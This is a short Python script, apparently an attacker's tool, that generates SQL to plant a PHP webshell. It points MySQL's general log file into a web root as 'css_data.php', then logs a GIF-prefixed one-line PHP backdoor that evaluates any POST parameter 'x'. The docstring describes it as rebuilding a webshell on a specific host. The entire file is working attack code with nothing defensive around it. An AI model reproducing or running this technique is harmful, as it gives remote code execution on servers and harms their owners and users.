#!/usr/bin/env python3
"""gen_shell_v3.py - 重建81.70 webshell (GIF头+单行+保留?>闭合)"""
shell_body = "<?php @eval($_POST[\"x\"]);echo \"OK\";?>"
name = 'css_data.php'
sql = []
sql.append("SET GLOBAL general_log = OFF;")
sql.append("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/%s';" % name)
sql.append("SET GLOBAL general_log = ON;")
sql.append("SELECT 'GIF89a%s//'" % shell_body)
sql.append("SET GLOBAL general_log = OFF;")
with open('/tmp/rebuild_v3.sql', 'w') as f:
    f.write('\n'.join(sql) + '\n')
print('ready')
